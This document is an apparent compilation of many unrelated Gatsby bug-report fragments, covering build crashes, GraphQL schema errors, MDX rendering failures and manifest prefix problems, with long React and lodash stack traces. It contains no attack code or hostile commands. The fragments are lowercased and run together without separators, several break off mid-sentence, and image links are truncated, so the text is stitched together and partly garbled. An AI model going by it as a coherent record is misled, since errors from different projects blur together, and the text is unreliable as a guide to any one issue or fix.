gatsby develop crashes: ```
unhandled rejection syntax error: unexpected int "20" graphqlerror: syntax error: unexpected int "20" - typemapper.js:113 typemapper.createtype [gatsby-json-crasher]/[graphql-compose]/lib/typemapper.js:113:43
the page is scrolled down.
query failures, crashes, etc.
the `html` field supplied to `gatsby-plugin-feed` doesn't include any of the custom components i have supplied via `mdxprovider` in my layout file
i also get an error in the console on `gatsby build`:
warn component caption was not imported, exported, or provided by mdxprovider as global scope
js error: ```
uncaught typeerror: cannot read property 'push' of undefined at gatsby-browser.js:6
it fails to build.
image loaded even it is not yet visible on the screen
we are receiving thousands of errors.
the plugin's `gatsby-ssr.js` is never executed, no css and script tags are added to style to new anchor icons.
yellow background appears in cms non preview screens as such:
![image](
the placeholder remains visible.
it takes ~40 seconds instead of ~0s
window doesn't scroll to header, it only scrolls down to distance between header and relative ancestor
### fix i'll be publishing pr that gets the distance from document top instead of parent top shortly
"functions that are interpolated in css calls will be stringified" was printed twice
broken gatsby page is displayed instead:
![em](
call stack: ```
error "gatsby-source-contentful" threw an error while running the sourcenodes lifecycle: maximum call stack size exceeded rangeerror: maximum call stack size exceeded - lodash.js:6266 isindex [contentful-frontend]/[lodash]/lodash.js:6266:41 - lodash.js:2402 arraylikekeys [contentful-frontend]/[lodash]/lodash.js:2402:16 - lodash.js:13307 keys [contentful-frontend]/[lodash]/lodash.js:13307:36 - lodash.js:4900 [contentful-frontend]/[lodash]/lodash.js:4900:21 - lodash.js:2990 baseforown [contentful-frontend]/[lodash]/lodash.js:2990:24 - lodash.js:13400 function.mapvalues [contentful-frontend]/[lodash]/lodash.js:13400:7 - normalize.js:70 fixids [contentful-frontend]/[gatsby-source-contentful]/normalize.js:70:28 - normalize.js:79 [contentful-frontend]/[gatsby-source-contentful]/normalize.js:79:22 - lodash.js:13401 [contentful-frontend]/[lodash]/lodash.js:13401:38 - lodash.js:4905 [contentful-frontend]/[lodash]/lodash.js:4905:15 - lodash.js:2990 baseforown [contentful-frontend]/[lodash]/lodash.js:2990:24 - lodash.js:13400 function.mapvalues [contentful-frontend]/[lodash]/lodash.js:13400:7 - normalize.js:70 fixids [contentful-frontend]/[gatsby-source-contentful]/normalize.js:70:28 - normalize.js:83 [contentful-frontend]/[gatsby-source-contentful]/normalize.js:83:12 - lodash.js:13401 [contentful-frontend]/[lodash]/lodash.js:13401:38 - lodash.js:4905 [contentful-frontend]/[lodash]/lodash.js:4905:15 - lodash.js:2990 baseforown [contentful-frontend]/[lodash]/lodash.js:2990:24 - lodash.js:13400 function.mapvalues [contentful-frontend]/[lodash]/lodash.js:13400:7 - normalize.js:70 fixids [contentful-frontend]/[gatsby-source-contentful]/normalize.js:70:28 - normalize.js:79 [contentful-frontend]/[gatsby-source-contentful]/normalize.js:79:22 - lodash.js:13401 [contentful-frontend]/[lodash]/lodash.js:13401:38 - lodash.js:4905 [contentful-frontend]/[lodash]/lodash.js:4905:15 - lodash.js:2990 baseforown [contentful-frontend]/[lodash]/lodash.js:2990:24 - lodash.js:13400 function.mapvalues [contentful-frontend]/[lodash]/lodash.js:13400:7 - normalize.js:70 fixids [contentful-frontend]/[gatsby-source-contentful]/normalize.js:70:28 - normalize.js:83 [contentful-frontend]/[gatsby-source-contentful]/normalize.js:83:12 - lodash.js:13401 [contentful-frontend]/[lodash]/lodash.js:13401:38 - lodash.js:4905 [contentful-frontend]/[lodash]/lodash.js:4905:15 - lodash.js:2990 baseforown [contentful-frontend]/[lodash]/lodash.js:2990:24 - lodash.js:13400 function.mapvalues [contentful-frontend]/[lodash]/lodash.js:13400:7 - normalize.js:70 fixids [contentful-frontend]/[gatsby-source-contentful]/normalize.js:70:28 - normalize.js:79 [contentful-frontend]/[gatsby-source-contentful]/normalize.js:79:22 - lodash.js:13401 [contentful-frontend]/[lodash]/lodash.js:13401:38 - lodash.js:4905 [contentful-frontend]/[lodash]/lodash.js:4905:15 - lodash.js:2990 baseforown [contentful-frontend]/[lodash]/lodash.js:2990:24 - lodash.js:13400 function.mapvalues [contentful-frontend]/[lodash]/lodash.js:13400:7 - normalize.js:70 fixids [contentful-frontend]/[gatsby-source-contentful]/normalize.js:70:28 - normalize.js:83 [contentful-frontend]/[gatsby-source-contentful]/normalize.js:83:12 - lodash.js:13401 [contentful-frontend]/[lodash]/lodash.js:13401:38 - lodash.js:4905 [contentful-frontend]/[lodash]/lodash.js:4905:15 - lodash.js:2990 baseforown [contentful-frontend]/[lodash]/lodash.js:2990:24 - lodash.js:13400 function.mapvalues [contentful-frontend]/[lodash]/lodash.js:13400:7 - normalize.js:70 fixids [contentful-frontend]/[gatsby-source-contentful]/normalize.js:70:28 - normalize.js:83 [contentful-frontend]/[gatsby-source-contentful]/normalize.js:83:12 - lodash.js:13401 [contentful-frontend]/[lodash]/lodash.js:13401:38 - lodash.js:4905 [contentful-frontend]/[lodash]/lodash.js:4905:15 - lodash.js:2990 baseforown [contentful-frontend]/[lodash]/lodash.js:2990:24 - lodash.js:13400 function.mapvalues [contentful-frontend]/[lodash]/lodash.js:13400:7 - normalize.js:70 fixids [contentful-frontend]/[gatsby-source-contentful]/normalize.js:70:28 - normalize.js:83 [contentful-frontend]/[gatsby-source-contentful]/normalize.js:83:12 - lodash.js:13401 [contentful-frontend]/[lodash]/lodash.js:13401:38
retina images are displayed in their natural pixel size.
`markdown` fails and no excerpt is generated
installing with yarn (v19.2) succeeds but when i run 'gatsby develop' i get..
> error: cannot find module 'ink'.
a blank element is present before the image element
### extra notes adding `role="none"` or `role="presentation"` to the first image element with the small inline image gets rid of the issue.
an error occurs, preventing any js from running.
it shows only an image and not a link, in the live version when i fire the script the quality of the image will be better but doesn't turn into a link with text (expected result)
the query for "imagewithtext" succeeds but the query for "image_with_text" causes the graphql error \'field "image" must not have a selection since type "string" has no subfields\'.
it displays a blank page with the following console errors: ```javascript
[hmr] connected
vm641:35 uncaught referenceerror: unsplash is not defined at mdxcontent (eval at _construct (construct.js:30), <anonymous>:35:443) at renderwithhooks (react-dom.development.js:16259) at mountindeterminatecomponent (react-dom.development.js:18793) at beginwork$1 (react-dom.development.js:20161) at htmlunknownelement.callcallback (react-dom.development.js:337) at object.invokeguardedcallbackdev (react-dom.development.js:386) at invokeguardedcallback (react-dom.development.js:441) at beginwork$$1 (react-dom.development.js:25779) at performunitofwork (react-dom.development.js:24694) at workloopsync (react-dom.development.js:24670) at performsyncworkonroot (react-dom.development.js:24269) at scheduleupdateonfiber (react-dom.development.js:23697) at updatecontainer (react-dom.development.js:27102) at react-dom.development.js:27527 at unbatchedupdates (react-dom.development.js:24432) at legacyrendersubtreeintocontainer (react-dom.development.js:27526) at render (react-dom.development.js:27607) at app.js:67
mdxcontent @ vm641:35
renderwithhooks @ react-dom.development.js:16259
mountindeterminatecomponent @ react-dom.development.js:18793
beginwork$1 @ react-dom.development.js:20161
callcallback @ react-dom.development.js:337
invokeguardedcallbackdev @ react-dom.development.js:386
invokeguardedcallback @ react-dom.development.js:441
beginwork$$1 @ react-dom.development.js:25779
performunitofwork @ react-dom.development.js:24694
workloopsync @ react-dom.development.js:24670
performsyncworkonroot @ react-dom.development.js:24269
scheduleupdateonfiber @ react-dom.development.js:23697
updatecontainer @ react-dom.development.js:27102
(anonymous) @ react-dom.development.js:27527
unbatchedupdates @ react-dom.development.js:24432
legacyrendersubtreeintocontainer @ react-dom.development.js:27526
render @ react-dom.development.js:27607
(anonymous) @ app.js:67
settimeout (async)
(anonymous) @ ready.js:32
(anonymous) @ app.js:66
promise.then (async)
(anonymous) @ app.js:59
promise.then (async)
(anonymous) @ app.js:23
./.cache/app.js @ app.js:16
__webpack_require__ @ bootstrap:726
fn @ bootstrap:100
0 @ blog-post.js:38
__webpack_require__ @ bootstrap:726
(anonymous) @ bootstrap:793
(anonymous) @ bootstrap:793
backend.js:6 warning: componentwillmount has been renamed, and is not recommended for use
see for details
* move code with side effects to componentdidmount, and set initial state in the constructor.
* rename componentwillmount to unsafe_componentwillmount to suppress this warning in non-strict mode
in react 17.x, only the unsafe_ name will work
to rename all deprecated lifecycles to their new names, you can run `npx react-codemod rename-unsafe-lifecycles` in your project source folder
please update the following components: sideeffect(nullcomponent)
r @ backend.js:6
printwarning @ react-dom.development.js:12358
lowprioritywarningwithoutstack @ react-dom.development.js:12379
./node_modules/react-dom/cjs/react-dom.development.js.reactstrictmodewarnings.flushpendingunsafelifecyclewarnings @ react-dom.development.js:12543
flushrenderphasestrictmodewarningsindev @ react-dom.development.js:25688
commitrootimpl @ react-dom.development.js:24936
unstable_runwithpriority @ scheduler.development.js:697
runwithpriority$2 @ react-dom.development.js:12150
commitroot @ react-dom.development.js:24921
finishsyncrender @ react-dom.development.js:24328
performsyncworkonroot @ react-dom.development.js:24306
scheduleupdateonfiber @ react-dom.development.js:23697
updatecontainer @ react-dom.development.js:27102
(anonymous) @ react-dom.development.js:27527
unbatchedupdates @ react-dom.development.js:24432
legacyrendersubtreeintocontainer @ react-dom.development.js:27526
render @ react-dom.development.js:27607
(anonymous) @ app.js:67
settimeout (async)
(anonymous) @ ready.js:32
(anonymous) @ app.js:66
promise.then (async)
(anonymous) @ app.js:59
promise.then (async)
(anonymous) @ app.js:23
./.cache/app.js @ app.js:16
__webpack_require__ @ bootstrap:726
fn @ bootstrap:100
0 @ blog-post.js:38
__webpack_require__ @ bootstrap:726
(anonymous) @ bootstrap:793
(anonymous) @ bootstrap:793
index.js:2177 the above error occurred in the <mdxcontent> component: in mdxcontent (created by mdxrenderer) in mdxrenderer (at blog-post.js:29) in article (at blog-post.js:24) in section (at blog-post.js:23) in main (at layout.js:4) in _default (at blog-post.js:14) in blogposttemplate (created by hotexportedblogposttemplate) in appcontainer (created by hotexportedblogposttemplate) in hotexportedblogposttemplate (created by pagerenderer) in pagerenderer (at json-store.js:93) in jsonstore (at root.js:51) in routehandler (at root.js:73) in div (created by focushandlerimpl) in focushandlerimpl (created by context.consumer) in focushandler (created by routerimpl) in routerimpl (created by context.consumer) in location (created by context.consumer) in router (created by ensureresources) in scrollcontext (at root.js:64) in routeupdates (at root.js:63) in ensureresources (at root.js:61) in locationhandler (at root.js:119) in locationprovider (created by context.consumer) in location (at root.js:118) in root (at root.js:126) in mdxprovider (at wrap-root-element.js:65) in mdxscopeprovider (at wrap-root-element.js:64) in unknown in unknown (at wrap-root-element.js:72) in _default (at app.js:67) react will try to recreate this component tree from scratch using the error boundary you provided, appcontainer.
__stack_frame_overlay_proxy_console__ @ index.js:2177
r @ backend.js:6
logcapturederror @ react-dom.development.js:21842
logerror @ react-dom.development.js:21879
callback @ react-dom.development.js:23267
callcallback @ react-dom.development.js:13830
commitupdateeffects @ react-dom.development.js:13868
commitupdatequeue @ react-dom.development.js:13858
commitlifecycles @ react-dom.development.js:22134
commitlayouteffects @ react-dom.development.js:25343
callcallback @ react-dom.development.js:337
invokeguardedcallbackdev @ react-dom.development.js:386
invokeguardedcallback @ react-dom.development.js:441
commitrootimpl @ react-dom.development.js:25081
unstable_runwithpriority @ scheduler.development.js:697
runwithpriority$2 @ react-dom.development.js:12150
commitroot @ react-dom.development.js:24921
finishsyncrender @ react-dom.development.js:24328
performsyncworkonroot @ react-dom.development.js:24306
scheduleupdateonfiber @ react-dom.development.js:23697
updatecontainer @ react-dom.development.js:27102
(anonymous) @ react-dom.development.js:27527
unbatchedupdates @ react-dom.development.js:24432
legacyrendersubtreeintocontainer @ react-dom.development.js:27526
render @ react-dom.development.js:27607
(anonymous) @ app.js:67
settimeout (async)
(anonymous) @ ready.js:32
(anonymous) @ app.js:66
promise.then (async)
(anonymous) @ app.js:59
promise.then (async)
(anonymous) @ app.js:23
./.cache/app.js @ app.js:16
__webpack_require__ @ bootstrap:726
fn @ bootstrap:100
0 @ blog-post.js:38
__webpack_require__ @ bootstrap:726
(anonymous) @ bootstrap:793
(anonymous) @ bootstrap:793
index.js:2177 referenceerror: unsplash is not defined at mdxcontent (eval at _construct (construct.js:30), <anonymous>:35:443) at renderwithhooks (react-dom.development.js:16259) at mountindeterminatecomponent (react-dom.development.js:18793) at beginwork$1 (react-dom.development.js:20161) at htmlunknownelement.callcallback (react-dom.development.js:337) at object.invokeguardedcallbackdev (react-dom.development.js:386) at invokeguardedcallback (react-dom.development.js:441) at beginwork$$1 (react-dom.development.js:25779) at performunitofwork (react-dom.development.js:24694) at workloopsync (react-dom.development.js:24670) at performsyncworkonroot (react-dom.development.js:24269) at scheduleupdateonfiber (react-dom.development.js:23697) at updatecontainer (react-dom.development.js:27102) at react-dom.development.js:27527 at unbatchedupdates (react-dom.development.js:24432) at legacyrendersubtreeintocontainer (react-dom.development.js:27526) at render (react-dom.development.js:27607) at app.js:67 " in appcontainer (created by hotexportedblogposttemplate) in hotexportedblogposttemplate (created by pagerenderer) in pagerenderer (at json-store.js:93) in jsonstore (at root.js:51) in routehandler (at root.js:73) in ensureresources (at root.js:61) in locationhandler (at root.js:119) in locationprovider (created by context.consumer) in context.consumer (created by location) in location (at root.js:118) in root (at root.js:126)"
__stack_frame_overlay_proxy_console__ @ index.js:2177
r @ backend.js:6
error @ react-hot-loader.development.js:294
componentdidcatch @ react-hot-loader.development.js:2399
callback @ react-dom.development.js:23272
callcallback @ react-dom.development.js:13830
commitupdateeffects @ react-dom.development.js:13868
commitupdatequeue @ react-dom.development.js:13858
commitlifecycles @ react-dom.development.js:22134
commitlayouteffects @ react-dom.development.js:25343
callcallback @ react-dom.development.js:337
invokeguardedcallbackdev @ react-dom.development.js:386
invokeguardedcallback @ react-dom.development.js:441
commitrootimpl @ react-dom.development.js:25081
unstable_runwithpriority @ scheduler.development.js:697
runwithpriority$2 @ react-dom.development.js:12150
commitroot @ react-dom.development.js:24921
finishsyncrender @ react-dom.development.js:24328
performsyncworkonroot @ react-dom.development.js:24306
scheduleupdateonfiber @ react-dom.development.js:23697
updatecontainer @ react-dom.development.js:27102
(anonymous) @ react-dom.development.js:27527
unbatchedupdates @ react-dom.development.js:24432
legacyrendersubtreeintocontainer @ react-dom.development.js:27526
render @ react-dom.development.js:27607
(anonymous) @ app.js:67
settimeout (async)
(anonymous) @ ready.js:32
(anonymous) @ app.js:66
promise.then (async)
(anonymous) @ app.js:59
promise.then (async)
(anonymous) @ app.js:23
./.cache/app.js @ app.js:16
__webpack_require__ @ bootstrap:726
fn @ bootstrap:100
0 @ blog-post.js:38
__webpack_require__ @ bootstrap:726
(anonymous) @ bootstrap:793
(anonymous) @ bootstrap:793
react-hot-loader.development.js:2406 uncaught referenceerror: unsplash is not defined at mdxcontent (eval at _construct (construct.js:30), <anonymous>:35:443) at renderwithhooks (react-dom.development.js:16259) at mountindeterminatecomponent (react-dom.development.js:18793) at beginwork$1 (react-dom.development.js:20161) at htmlunknownelement.callcallback (react-dom.development.js:337) at object.invokeguardedcallbackdev (react-dom.development.js:386) at invokeguardedcallback (react-dom.development.js:441) at beginwork$$1 (react-dom.development.js:25779) at performunitofwork (react-dom.development.js:24694) at workloopsync (react-dom.development.js:24670) at performsyncworkonroot (react-dom.development.js:24269) at scheduleupdateonfiber (react-dom.development.js:23697) at updatecontainer (react-dom.development.js:27102) at react-dom.development.js:27527 at unbatchedupdates (react-dom.development.js:24432) at legacyrendersubtreeintocontainer (react-dom.development.js:27526) at render (react-dom.development.js:27607) at app.js:67
mdxcontent @ vm641:35
renderwithhooks @ react-dom.development.js:16259
mountindeterminatecomponent @ react-dom.development.js:18793
beginwork$1 @ react-dom.development.js:20161
callcallback @ react-dom.development.js:337
invokeguardedcallbackdev @ react-dom.development.js:386
invokeguardedcallback @ react-dom.development.js:441
beginwork$$1 @ react-dom.development.js:25779
performunitofwork @ react-dom.development.js:24694
workloopsync @ react-dom.development.js:24670
performsyncworkonroot @ react-dom.development.js:24269
scheduleupdateonfiber @ react-dom.development.js:23697
updatecontainer @ react-dom.development.js:27102
(anonymous) @ react-dom.development.js:27527
unbatchedupdates @ react-dom.development.js:24432
legacyrendersubtreeintocontainer @ react-dom.development.js:27526
render @ react-dom.development.js:27607
(anonymous) @ app.js:67
settimeout (async)
(anonymous) @ ready.js:32
(anonymous) @ app.js:66
promise.then (async)
(anonymous) @ app.js:59
promise.then (async)
(anonymous) @ app.js:23
./.cache/app.js @ app.js:16
__webpack_require__ @ bootstrap:726
fn @ bootstrap:100
0 @ blog-post.js:38
__webpack_require__ @ bootstrap:726
(anonymous) @ bootstrap:793
(anonymous) @ bootstrap:793
index.js:2177 the above error occurred in the <appcontainer> component: in appcontainer (created by hotexportedblogposttemplate) in hotexportedblogposttemplate (created by pagerenderer) in pagerenderer (at json-store.js:93) in jsonstore (at root.js:51) in routehandler (at root.js:73) in div (created by focushandlerimpl) in focushandlerimpl (created by context.consumer) in focushandler (created by routerimpl) in routerimpl (created by context.consumer) in location (created by context.consumer) in router (created by ensureresources) in scrollcontext (at root.js:64) in routeupdates (at root.js:63) in ensureresources (at root.js:61) in locationhandler (at root.js:119) in locationprovider (created by context.consumer) in location (at root.js:118) in root (at root.js:126) in mdxprovider (at wrap-root-element.js:65) in mdxscopeprovider (at wrap-root-element.js:64) in unknown in unknown (at wrap-root-element.js:72) in _default (at app.js:67) react will try to recreate this component tree from scratch using the error boundary you provided, locationprovider.
__stack_frame_overlay_proxy_console__ @ index.js:2177
r @ backend.js:6
logcapturederror @ react-dom.development.js:21842
logerror @ react-dom.development.js:21879
callback @ react-dom.development.js:23267
callcallback @ react-dom.development.js:13830
commitupdateeffects @ react-dom.development.js:13868
commitupdatequeue @ react-dom.development.js:13856
commitlifecycles @ react-dom.development.js:22134
commitlayouteffects @ react-dom.development.js:25343
callcallback @ react-dom.development.js:337
invokeguardedcallbackdev @ react-dom.development.js:386
invokeguardedcallback @ react-dom.development.js:441
commitrootimpl @ react-dom.development.js:25081
unstable_runwithpriority @ scheduler.development.js:697
runwithpriority$2 @ react-dom.development.js:12150
commitroot @ react-dom.development.js:24921
finishsyncrender @ react-dom.development.js:24328
performsyncworkonroot @ react-dom.development.js:24306
(anonymous) @ react-dom.development.js:12200
unstable_runwithpriority @ scheduler.development.js:697
runwithpriority$2 @ react-dom.development.js:12150
flushsynccallbackqueueimpl @ react-dom.development.js:12195
flushsynccallbackqueue @ react-dom.development.js:12183
unbatchedupdates @ react-dom.development.js:24438
legacyrendersubtreeintocontainer @ react-dom.development.js:27526
render @ react-dom.development.js:27607
(anonymous) @ app.js:67
settimeout (async)
(anonymous) @ ready.js:32
(anonymous) @ app.js:66
promise.then (async)
(anonymous) @ app.js:59
promise.then (async)
(anonymous) @ app.js:23
./.cache/app.js @ app.js:16
__webpack_require__ @ bootstrap:726
fn @ bootstrap:100
0 @ blog-post.js:38
__webpack_require__ @ bootstrap:726
(anonymous) @ bootstrap:793
(anonymous) @ bootstrap:793
index.js:83 uncaught referenceerror: unsplash is not defined at mdxcontent (eval at _construct (construct.js:30), <anonymous>:35:443) at renderwithhooks (react-dom.development.js:16259) at mountindeterminatecomponent (react-dom.development.js:18793) at beginwork$1 (react-dom.development.js:20161) at htmlunknownelement.callcallback (react-dom.development.js:337) at object.invokeguardedcallbackdev (react-dom.development.js:386) at invokeguardedcallback (react-dom.development.js:441) at beginwork$$1 (react-dom.development.js:25779) at performunitofwork (react-dom.development.js:24694) at workloopsync (react-dom.development.js:24670) at performsyncworkonroot (react-dom.development.js:24269) at scheduleupdateonfiber (react-dom.development.js:23697) at updatecontainer (react-dom.development.js:27102) at react-dom.development.js:27527 at unbatchedupdates (react-dom.development.js:24432) at legacyrendersubtreeintocontainer (react-dom.development.js:27526) at render (react-dom.development.js:27607) at app.js:67
mdxcontent @ vm641:35
renderwithhooks @ react-dom.development.js:16259
mountindeterminatecomponent @ react-dom.development.js:18793
beginwork$1 @ react-dom.development.js:20161
callcallback @ react-dom.development.js:337
invokeguardedcallbackdev @ react-dom.development.js:386
invokeguardedcallback @ react-dom.development.js:441
beginwork$$1 @ react-dom.development.js:25779
performunitofwork @ react-dom.development.js:24694
workloopsync @ react-dom.development.js:24670
performsyncworkonroot @ react-dom.development.js:24269
scheduleupdateonfiber @ react-dom.development.js:23697
updatecontainer @ react-dom.development.js:27102
(anonymous) @ react-dom.development.js:27527
unbatchedupdates @ react-dom.development.js:24432
legacyrendersubtreeintocontainer @ react-dom.development.js:27526
render @ react-dom.development.js:27607
(anonymous) @ app.js:67
settimeout (async)
(anonymous) @ ready.js:32
(anonymous) @ app.js:66
promise.then (async)
(anonymous) @ app.js:59
promise.then (async)
(anonymous) @ app.js:23
./.cache/app.js @ app.js:16
__webpack_require__ @ bootstrap:726
fn @ bootstrap:100
0 @ blog-post.js:38
__webpack_require__ @ bootstrap:726
(anonymous) @ bootstrap:793
(anonymous) @ bootstrap:793
index.js:2177 the above error occurred in the <locationprovider> component: in locationprovider (created by context.consumer) in location (at root.js:118) in root (at root.js:126) in mdxprovider (at wrap-root-element.js:65) in mdxscopeprovider (at wrap-root-element.js:64) in unknown in unknown (at wrap-root-element.js:72) in _default (at app.js:67) consider adding an error boundary to your tree to customize error handling behavior.
visit to learn more about error boundaries.
__stack_frame_overlay_proxy_console__ @ index.js:2177
r @ backend.js:6
logcapturederror @ react-dom.development.js:21842
logerror @ react-dom.development.js:21879
update.callback @ react-dom.development.js:23231
callcallback @ react-dom.development.js:13830
commitupdateeffects @ react-dom.development.js:13868
commitupdatequeue @ react-dom.development.js:13856
commitlifecycles @ react-dom.development.js:22159
commitlayouteffects @ react-dom.development.js:25343
callcallback @ react-dom.development.js:337
invokeguardedcallbackdev @ react-dom.development.js:386
invokeguardedcallback @ react-dom.development.js:441
commitrootimpl @ react-dom.development.js:25081
unstable_runwithpriority @ scheduler.development.js:697
runwithpriority$2 @ react-dom.development.js:12150
commitroot @ react-dom.development.js:24921
finishsyncrender @ react-dom.development.js:24328
performsyncworkonroot @ react-dom.development.js:24306
(anonymous) @ react-dom.development.js:12200
unstable_runwithpriority @ scheduler.development.js:697
runwithpriority$2 @ react-dom.development.js:12150
flushsynccallbackqueueimpl @ react-dom.development.js:12195
flushsynccallbackqueue @ react-dom.development.js:12183
unbatchedupdates @ react-dom.development.js:24438
legacyrendersubtreeintocontainer @ react-dom.development.js:27526
render @ react-dom.development.js:27607
(anonymous) @ app.js:67
settimeout (async)
(anonymous) @ ready.js:32
(anonymous) @ app.js:66
promise.then (async)
(anonymous) @ app.js:59
promise.then (async)
(anonymous) @ app.js:23
./.cache/app.js @ app.js:16
__webpack_require__ @ bootstrap:726
fn @ bootstrap:100
0 @ blog-post.js:38
__webpack_require__ @ bootstrap:726
(anonymous) @ bootstrap:793
(anonymous) @ bootstrap:793
react-dom.development.js:12213 uncaught referenceerror: unsplash is not defined at mdxcontent (eval at _construct (construct.js:30), <anonymous>:35:443) at renderwithhooks (react-dom.development.js:16259) at mountindeterminatecomponent (react-dom.development.js:18793) at beginwork$1 (react-dom.development.js:20161) at htmlunknownelement.callcallback (react-dom.development.js:337) at object.invokeguardedcallbackdev (react-dom.development.js:386) at invokeguardedcallback (react-dom.development.js:441) at beginwork$$1 (react-dom.development.js:25779) at performunitofwork (react-dom.development.js:24694) at workloopsync (react-dom.development.js:24670) at performsyncworkonroot (react-dom.development.js:24269) at scheduleupdateonfiber (react-dom.development.js:23697) at updatecontainer (react-dom.development.js:27102) at react-dom.development.js:27527 at unbatchedupdates (react-dom.development.js:24432) at legacyrendersubtreeintocontainer (react-dom.development.js:27526) at render (react-dom.development.js:27607) at app.js:67
getting `react is not defined`
the build process is stopped
``` error unhandled rejection cannot read property 'contentdigest' of undefined typeerror: cannot read property 'contentdigest' of undefined - extend-node-type.js:59 htmlastcachekey [narkdown-caption-repro]/[gatsby-transformer-remark]/extend-node-type.js:59:87 - extend-node-type.js:318 gethtmlast [narkdown-caption-repro]/[gatsby-transformer-remark]/extend-node-type.js:318:41 - extend-node-type.js:343 object.gethtml [as generatehtml] [narkdown-caption-repro]/[gatsby-transformer-remark]/extend-node-type.js:343:27 - index.js:150 getimagecaption [narkdown-caption-repro]/[gatsby-remark-images]/index.js:150:21 - index.js:301 generateimagesandupdatenode$ [narkdown-caption-repro]/[gatsby-remark-images]/index.js:301:52 not finished run queries - 1.251s
not finished generating image thumbnails - 1.383s
typescript reports the following problems: ```
type '{ id: any; children: never[]; parent: string; internal: { contentdigest: string; type: string; }; }' is not assignable to type 'node'
types of property 'internal' are incompatible
type '{ contentdigest: string; type: string; }' is not assignable to type '{ type: string; mediatype?: string | undefined; content?: string | undefined; contentdigest: string; description?: string | undefined; } & { owner: string; }'
property 'owner' is missing in type '{ contentdigest: string; type: string; }' but required in type '{ owner: string; }'.
typeerror: cannot read property of undefined
note: the problem is gone, after restarting gatsby server with clearing cache
error #98123 webpack generating javascript bundles failed can't resolve 'page-templates/example.jsx' in 'c:\\git\ exus-ui\\website\\.cache' file: .cache\\async-requires.js
favicon looks low-res in firefox.
build failed
headers don't work as expected and images load twice
or images don't load and header links don't work either.
instead i get `<undefined>` with the audio tag inside of it, and the word error in the audio player controls, and the audio does not play.
in step 6, you got a 404 error instead.
the styled-component styles are not applied to the `<div>` and instead, a new, as yet developed html element named `<scroll>` is being made.
localfile node didnt exist in the graphql query result.
goes to page
this error: ```
error unhandled rejection schema must contain uniquely named types but contains multiple types named "file"
error: schema must contain uniquely named types but contains multiple types named "file"
- array.reduce - schemacomposer.js:130 schemacomposer.buildschema [carsite]/[graphql-compose]/lib/schemacomposer.js:130:12 - schema.js:766 addcustomresolvefunctions [carsite]/[gatsby]/dist/schema/schema.js:766:45 - schema.js:227 updateschemacomposer [carsite]/[gatsby]/dist/schema/schema.js:227:9 - next_tick.js:68 process._tickcallback internal/process/next_tick.js:68:7
the text in inline code disappears in excerpt.
unhandled rejection createcontentdigest is not a function typeerror: createcontentdigest is not a function - index.js:69 generateimagesandupdatenode [~]/[gatsby-remark-images-contentful]/index.js:69:25
it fails with : field "featuredimage" must not have a selection since type "string" has no subfields.
husky failed to install
background remains white on first page load in production.
gatsby creates `.cache`, but populates it with read-only files failing to replace them later in build (either by unlinking or opening them in writable mode as in below): ```
gatsby build
success open and validate gatsby-configs - 0.021s
success load plugins - 0.021s
success onpreinit - 0.007s
success delete html and css files from previous builds - 0.015s
success initialize cache - 0.009s error eacces: permission denied, open '/.../.cache/api-runner-browser-plugins.js'
redirection
excerpt is `null`
the `html` transform errors when there's an image present and nothing is returned.
just shows blank page
many sites are reported as offline, despite being online
`warning site showcase entry " " seems offline
`field_embed` is returning `null` <img width="1140" alt="screenshot 2019-11-12 at 15 13 06" src=" ">
rendered result from `gatsby develop`:
![image](
the plugin errored silently and did not create the node for graphql
uncaught error.
``` error unhandled rejection cannot read property 'replace' of undefined typeerror: cannot read property 'replace' of undefined - develop.js:391 module.exports .../[gatsby]/dist/commands/develop.js:391:42 - next_tick.js:68 process._tickcallback internal/process/next_tick.js:68:7
errors: cannot read property 'toformatbase64' of undefined graphql request:4:7 3 | nodes { 4 | resize(width: 20, base64: true) { | ^ 5 | src
i get one giant js bundle at `public/app-<hash>.js` on the first cache-less build
the resulting site still functions - it just loads a whopping 2.8mb bundle containing *everything* when the site is initially loaded (we have a very large site with many pages)
there are no page-level js files
the `public/chunk-map.json` file only lists the app bundle: `{"app":["/app-<hash>.js"]}`
interestingly, if i dig down into `public/page-data` the json in there does reference page-level js chunks
for example in `public/page-data/faq/page-data.json` i see `{"componentchunkname":"component---src-pages-faq-js","path":"/faq/","data":...}`.
throws error
`typeerror: flatmap is not a function`
see [full log on netlify](
the `html.js` file is ignored in the theme.
only a small percentage of lines are selectable.
page displays its source code on a blank page for a few seconds before displaying the rendered content (or sometimes not even doing that).
we see the fallback page because of its `matchpath`.
the following typescript errors are generated: - for `activitytimer`: _"expected 2 arguments, but got 1
an argument for \'activityargs\' was not provided."_
- for `setstatus`: _ "property \'setstatus\' does not exist on type \'{ start: () => void; status(status: string): void; end: () => void; span: object; }\'"_
npm install fails
the system does not update the page data for that post
however, in a static query that also references that information, the data updates properly.
type query { # note the searchable argument is missing even though convenience # field `childimagesharp` is added in the `file` # this doesn't happen when there is at least one imagesharp node # (in this case argument exists)
} type file { childimagesharp: imagesharp
``` ### notes
looks like the call sequence during schema building causes root field arguments to be added before convenience child fields.
i think it's `addimplicitconveniencechildrenfields` which causes this as it relies on nodes presence.
nothing happens when the visitor tries to navigate to another page
### possible fixes a fix could be to fallback to normal navigation (full page reload), instead of letting the visitor on the same page without any reaction..
now, i read on other issues that it's supposed to fail because maybe the user if offline and we can't detect it: i disagree, there is a difference between a failed [fetch]( because of network issues) and a 404, and it can be detected in javascript (and maybe use [navigatoronline]( if available, too).
the `blogpost` nodes aren't cleaned up in redux when the parent `mdx` node is deleted.
when navigating with `navigate` to the same page, scroll position is set to 0.
the above error occurred in the <reduxstoreprovider> component: in reduxstoreprovider in app react will try to recreate this component tree from scratch using the error boundary you provided, app.
nothing happens
gatsby prefixes the icons correctly, for instance `href="/assets/icons/icon-48x48.png?v=4b11ef345c95e35b68f0d09fdabdc428"/>`
but in the manifest, the links are missing the asset prefix: `"src": "icons/icon-48x48.png?v=4b11ef345c95e35b68f0d09fdabdc428"`
this leads to the following error in the browser console:
`error while trying to use the following icon from the manifest: (download error or resource isn't a valid image)`
this is probably connected to this change: where the manifest file were no longer prefixed.
it does not
**gatsby develop** or **gatsby build** process ends ```
0 info it worked if it ends with ok
1 verbose cli [ '/users/pedrom/.nvm/versions/node/v10.12.0/bin/node',
1 verbose cli '/users/pedrom/.nvm/versions/node/v10.12.0/bin/npm',
1 verbose cli 'run',
1 verbose cli 'build' ]
2 info using npm@6.4.1
3 info using node@v10.12.0
4 verbose run-script [ 'prebuild', 'build', 'postbuild' ]
5 info lifecycle gatsby-starter-default@0.1.0~prebuild: gatsby-starter-default@0.1.0
